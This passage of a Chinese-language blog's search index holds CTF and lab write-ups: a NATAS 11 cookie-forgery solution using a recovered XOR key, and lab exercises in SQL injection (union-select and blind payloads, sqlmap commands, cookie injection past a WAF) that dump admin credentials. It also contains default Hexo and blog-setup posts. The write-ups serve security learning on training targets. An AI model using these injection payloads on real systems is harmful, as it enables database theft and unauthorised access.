<p>将编码后的值存到_COOKIE[“data”]中。</p>
<p>xor_encrypt()函数内容为</p>
<pre><code>function xor_encrypt($in) &#123;
    $key = &#39;&lt;censored&gt;&#39;;#键值
    $text = $in;#输入值
    $outText = &#39;&#39;;
// Iterate through each character
for($i=0;$i&lt;strlen($text);$i++) &#123;
$outText .= $text[$i] ^ $key[$i % strlen($key)];
&#125;

return $outText;#新值
&#125;
</code></pre>
<p>综上，xor..函数的输入值是将原cookie经过base64_decode的值</p>
<p>思路为：原始data 异或 key&#x3D;加密data</p>
<p>​				原始data 异或 加密data&#x3D;key</p>
<p>​				之后再构造新data，即(…&#x3D;“yes”)，用得到的key加密，存回cookie</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">原始data为array( &quot;showpassword&quot;=&gt;&quot;no&quot;, &quot;bgcolor&quot;=&gt;&quot;#ffffff&quot;);</span><br></pre></td></tr></table></figure>

<p>通过f12网络可知data</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516230016557.png" alt="image-20230516230016557"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">加密data为MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qe354bjY%3D</span><br></pre></td></tr></table></figure>

<p>异或俩data，得到key</p>
<p>得到的值有点怪</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$data=base64_decode(&quot;MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qe354bjY%3D&quot;);</span><br><span class="line">	function xor_encrypt($in) &#123;</span><br><span class="line">		$key =json_encode(array(&quot;showpassword&quot;=&gt;&quot;no&quot;, &quot;bgcolor&quot;=&gt;&quot;#ffffff&quot;));</span><br><span class="line">		$text = $in;</span><br><span class="line">		$outText = &#x27;&#x27;;</span><br><span class="line"></span><br><span class="line">		// Iterate through each character</span><br><span class="line">		for($i=0;$i&lt;strlen($text);$i++) &#123;</span><br><span class="line">		$outText .= $text[$i]^ $key[$i % strlen($key)];</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		return $outText;</span><br><span class="line">	&#125;</span><br><span class="line">echo xor_encrypt($data);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516234336935.png" alt="image-20230516234336935"></p>
<p>这三个框emmm</p>
<p><strong>所以key&#x3D;KNHLKNHLKNHLKNHLKNHLKNHLKNHLKNHLKNHLLKL</strong></p>
<p>我这里出现了问题，key是它的话，不成功，但是看大佬的wp，是只取了前4位的，所以我也取前4位试试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$data=array( &quot;showpassword&quot;=&gt;&quot;yes&quot;, &quot;bgcolor&quot;=&gt;&quot;#ffffff&quot;);</span><br><span class="line">	function xor_encrypt($in) &#123;</span><br><span class="line">		$key =&#x27;KNHL&#x27;;</span><br><span class="line">		$text = $in;</span><br><span class="line">		$outText = &#x27;&#x27;;</span><br><span class="line"></span><br><span class="line">		// Iterate through each character</span><br><span class="line">		for($i=0;$i&lt;strlen($text);$i++) &#123;</span><br><span class="line">		$outText .= $text[$i]^ $key[$i % strlen($key)];</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		return $outText;</span><br><span class="line">	&#125;</span><br><span class="line">echo base64_encode(xor_encrypt(json_encode($data)));</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>MGw7JCQ5OC04PT8jOSpqdmk3LT9pYmouLC0nICQ8anZpbS4qLSguKmkz这就是新cookie了，用bp进行POST时，Cookie换上它。其实也可以f12控制台里document.cookie进行设置</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516235350410.png" alt="image-20230516235350410"></p>
<h2 id="NATAS-12-文件上传-待续"><a href="#NATAS-12-文件上传-待续" class="headerlink" title="NATAS 12(文件上传) 待续"></a>NATAS 12(文件上传) 待续</h2>]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>security</tag>
        <tag>web</tag>
        <tag>NATAS</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2023/05/12/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>封神台靶场</title>
    <url>/2023/05/15/%E5%B0%81%E7%A5%9E%E5%8F%B0/</url>
    <content><![CDATA[<h2 id="一、女神小芳"><a href="#一、女神小芳" class="headerlink" title="一、女神小芳"></a>一、女神小芳</h2><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515211214636.png" alt="image-20230515211214636"></p>
<h3 id="1-注入位置判断"><a href="#1-注入位置判断" class="headerlink" title="1.注入位置判断"></a>1.注入位置判断</h3><p>id&#x3D;1,2,3时有不同页面，猜测id处可以注入</p>
<h3 id="2-注入类型判断（判断错误）"><a href="#2-注入类型判断（判断错误）" class="headerlink" title="2.注入类型判断（判断错误）"></a>2.注入类型判断（判断错误）</h3><p>&#x3D;&#x3D;<strong>显然没有回显位，故不用联合注入</strong>&#x3D;&#x3D;</p>
<p>1’、1”时页面不正常且不显示内容，故没有报错注入</p>
<p>&#x3D;&#x3D;首先进行数字型注入&#x3D;&#x3D;</p>
<p>&#x3D;&#x3D;<code>id=1 and 1=1 时页面正常</code>&#x3D;&#x3D;</p>
<p>&#x3D;&#x3D;<code>id=1 and 1=2 时页面不正常</code>&#x3D;&#x3D;</p>
<p>&#x3D;&#x3D;故数字型盲注。&#x3D;&#x3D;</p>
<p>看了wp才发现，原来还是可以用联合注入的，想当然了，以为回显位(order by)只出现在有输入框的地方。</p>
<h2 id="3-联合注入"><a href="#3-联合注入" class="headerlink" title="3.联合注入"></a>3.联合注入</h2><h3 id="1-order-by判断可显示列数"><a href="#1-order-by判断可显示列数" class="headerlink" title="1.order by判断可显示列数"></a>1.order by判断可显示列数</h3><p><code>id=1 order by 3内容为空 by 2为正常值</code></p>
<p>故回显位2</p>
<h3 id="2-union-select"><a href="#2-union-select" class="headerlink" title="2.union select"></a>2.union select</h3><p><code>?id=10000 union select 1,2#</code> id&#x3D;-1这种不行，被处理过了</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515235328914.png" alt="image-20230515235328914"></p>
<p>2改为database()，显示maoshe</p>
<h3 id="3-爆表"><a href="#3-爆表" class="headerlink" title="3.爆表"></a>3.爆表</h3><p>?id&#x3D;10000 union select 1,(select group_concat(’~‘,table_name) from information_schema.tables where table_schema&#x3D;database())#</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515235921469.png" alt="image-20230515235921469"></p>
<h3 id="4-爆列名"><a href="#4-爆列名" class="headerlink" title="4.爆列名"></a>4.爆列名</h3><p>?id&#x3D;10000%20union%20select%201,(select%20group_concat(%27~%27,column_name)%20from%20information_schema.columns%20where%20table_schema&#x3D;database()%20and%20table_name&#x3D;%27admin%27)#</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516001033181.png" alt="image-20230516001033181"></p>
<h3 id="5-爆列名值"><a href="#5-爆列名值" class="headerlink" title="5.爆列名值"></a>5.爆列名值</h3><p>?id&#x3D;10000%20union%20select%201,(select group_concat(‘~’,password) from admin)#</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516001159511.png" alt="image-20230516001159511"></p>
<h3 id="6-总结"><a href="#6-总结" class="headerlink" title="6.总结"></a>6.总结</h3><p>不能简单认为无输入框就没有联合注入，还是要多想，多尝试。</p>
<h2 id="盲注过程，算是复习吧qaq"><a href="#盲注过程，算是复习吧qaq" class="headerlink" title="盲注过程，算是复习吧qaq"></a>盲注过程，算是复习吧qaq</h2><h3 id="3-数据库长度判断"><a href="#3-数据库长度判断" class="headerlink" title="3.数据库长度判断"></a>3.数据库长度判断</h3><p><code>id=1%20and%20length(database())&gt;5 时正常，&gt;6时不正常</code></p>
<p>故database()长度为6</p>
<h3 id="4-数据库爆破"><a href="#4-数据库爆破" class="headerlink" title="4.数据库爆破"></a>4.数据库爆破</h3><p><code>id=1 and ascii(substr(database(),&#123;1&#125;,1)) &gt; &#123;1&#125; #判断第一个字母</code></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515215548482.png" alt="image-20230515215548482"></p>
<p>数据库名maoshe</p>
<h3 id="5-表名长度判断"><a href="#5-表名长度判断" class="headerlink" title="5.表名长度判断"></a>5.表名长度判断</h3><p><code>id=1 and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)&gt;4正常，&gt;5时不正常</code></p>
<p>故第一个表名长度5 </p>
<h3 id="6-表名爆破"><a href="#6-表名爆破" class="headerlink" title="6.表名爆破"></a>6.表名爆破</h3><p><code>id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=&#39;maoshe&#39; limit 0,1),&#123;0&#125;,1))&gt;&#123;1&#125;</code>#判断表名第一个字符</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230515215706751.png" alt="image-20230515215706751"></p>
<p>第一个表名admin</p>
<p>第二个表名dirs</p>
<p>第三个表名news</p>
<p>第四个表名xss</p>
<h3 id="7-列名长度判断"><a href="#7-列名长度判断" class="headerlink" title="7.列名长度判断"></a>7.列名长度判断</h3><p>id &#x3D;1 and (select length(column_name) from information_schema. columns where table_name &#x3D; ‘admin’ and table_schema &#x3D; ‘maoshe’  limit  0,1)&gt;1 &#x2F;&#x2F;列名</p>
<h3 id="8-列名判断"><a href="#8-列名判断" class="headerlink" title="8.列名判断"></a>8.列名判断</h3><p><code>id =1 and ascii(substr((select column_name from information_schema.columns where table_name = &#39;admin&#39; and table_schema = &#39;maoshe&#39; limit  0,1),&#123;0&#125;,1))&gt;&#123;1&#125; //列名</code></p>
<p>admin表的列名Id、username、passwGrd</p>
<p>dirs表的列名paths</p>
<p>news表的列名id、content</p>
<p>xss表的列名id、user、pass</p>
<h3 id="9-爆值"><a href="#9-爆值" class="headerlink" title="9.爆值"></a>9.爆值</h3><p>看下xss的pass字段吧</p>
<p><code>id=1 and ascii(substr((select &#39;pass&#39; from &#39;xss&#39; limit  0,1),&#123;0&#125;,1))&gt;&#123;1&#125;</code></p>
<p>嘶，没跑出来flag的字样的，哪里漏掉了</p>
<h3 id="10-sqlmap"><a href="#10-sqlmap" class="headerlink" title="10.sqlmap"></a>10.sqlmap</h3><p>用sqlmap解决吧。</p>
<blockquote>
<p>python sqlmap.py -u “<a href="http://pu2lh35s.ia.aqlab.cn/?id=2">http://pu2lh35s.ia.aqlab.cn/?id=2</a>“ –dbs</p>
<p>跑出了maoshe、test、information_schema</p>
<p>python sqlmap.py -u “<a href="http://pu2lh35s.ia.aqlab.cn/?id=2">http://pu2lh35s.ia.aqlab.cn/?id=2</a>“  -D maoshe –tables</p>
<p>表名没问题</p>
<p>python sqlmap.py -u “<a href="http://pu2lh35s.ia.aqlab.cn/?id=2">http://pu2lh35s.ia.aqlab.cn/?id=2</a>“  -D maoshe -T admin –columns –dump</p>
<p>emm，admin表中的列是password，脚本还跑错了。</p>
</blockquote>
<h1 id="二、WAF过滤"><a href="#二、WAF过滤" class="headerlink" title="二、WAF过滤"></a>二、WAF过滤</h1><h2 id="1-注入位置判断-1"><a href="#1-注入位置判断-1" class="headerlink" title="1.注入位置判断"></a>1.注入位置判断</h2><p><img src="/../../../Typora/img111/image-20230516095034637.png" alt="image-20230516095034637"></p>
<p>找到新闻中任意一个具体页面，出现id&#x3D;171，猜测有注入点</p>
<h2 id="2-尝试闭合"><a href="#2-尝试闭合" class="headerlink" title="2.尝试闭合"></a>2.尝试闭合</h2><p>and、单引号等，and的双写也被过滤了</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516095129031.png" alt="image-20230516095129031"></p>
<p>提示过滤了and update delete ; insert mid master</p>
<p>双引号和括号发现提示数据库出错</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516095308937.png" alt="image-20230516095308937"></p>
<p>而且这个order by的话就到10了。</p>
<p>各种传统关键字绕过尝试后，没其他办法了</p>
<p>看了wp，才知道用cookie，这里我用的工具是burp。</p>
<h2 id="3-先抓包"><a href="#3-先抓包" class="headerlink" title="3.先抓包"></a>3.先抓包</h2><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516113815024.png" alt="image-20230516113815024"></p>
<p>右键发送repeate，删除掉?id&#x3D;171，避免接受url参数，转而添加Cookie参数，先 添加id&#x3D;171试试</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516114902620.png" alt="image-20230516114902620"></p>
<p>页面显示正常，可以尝试联合注入</p>
<h2 id="4-联合注入"><a href="#4-联合注入" class="headerlink" title="4.联合注入"></a>4.联合注入</h2><h3 id="1-union-select"><a href="#1-union-select" class="headerlink" title="1.union select"></a>1.union select</h3><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516115631577.png" alt="image-20230516115631577"></p>
<p><code>id=1710000%20union%20select%201,2,3,4,5,6,7,8,9,10%20from%20admin;</code></p>
<p>注意空格记得填充，无论是%20还是+都可以</p>
<p>之所以加from admin，目的是猜测admin是否存在。</p>
<p>显示结果如下：</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516115712683.png" alt="image-20230516115712683"></p>
<p>证明表admin是存在的</p>
<h3 id="2-猜解字段名"><a href="#2-猜解字段名" class="headerlink" title="2.猜解字段名"></a>2.猜解字段名</h3><p>这里参考的官方wp是说，直接猜解常见字段名</p>
<p><code>id=1710000%20union%20select%201,username,3,4,5,6,7,8,password,10%20from%20admin;</code></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516120410289.png" alt="image-20230516120410289"></p>
<p>数字加字母的16位组合，看出密码像是md5特征，解密试试</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516121144887.png" alt="image-20230516121144887"></p>
<p>得到明文内容为welcome的密码</p>
<p>已知账号与密码，尝试后台登录。</p>
<h3 id="3-登录"><a href="#3-登录" class="headerlink" title="3.登录"></a>3.登录</h3><p>这是根据经验猜解的后台路径吧。。。。根目录下&#x2F;admin</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516121550218.png" alt="image-20230516121550218"></p>
<p>输入admin,welcome</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516121649512.png" alt="image-20230516121649512"></p>
<h2 id="5-总结"><a href="#5-总结" class="headerlink" title="5.总结"></a>5.总结</h2><p>当url上各种绕过尝试失效时，应该要联想到其它注入方式，如Cookie注入等。</p>
]]></content>
      <categories>
        <category>靶场演练</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
        <tag>靶场</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>第一篇博客</title>
    <url>/2023/05/12/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<p>参照了杰克小麻雀所分享的经验而搭建的。</p>
<blockquote>
<p><a href="https://blog.csdn.net/yushuaigee/article/details/111465155">(112条消息) 从零开始免费搭建自己的博客(一)——本地搭建hexo框架_在k什么框架搭建博客_杰克小麻雀的博客-CSDN博客</a></p>
</blockquote>
<p>主题优化参照如下：</p>
<p><a href="https://shen-yu.gitee.io/2019/ayer/#%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE">Ayer中文说明 | 岛 (gitee.io)</a></p>
]]></content>
      <categories>
        <category>博客搭建及其优化</category>
      </categories>
      <tags>
        <tag>博客经验来源</tag>
      </tags>
  </entry>
</search>
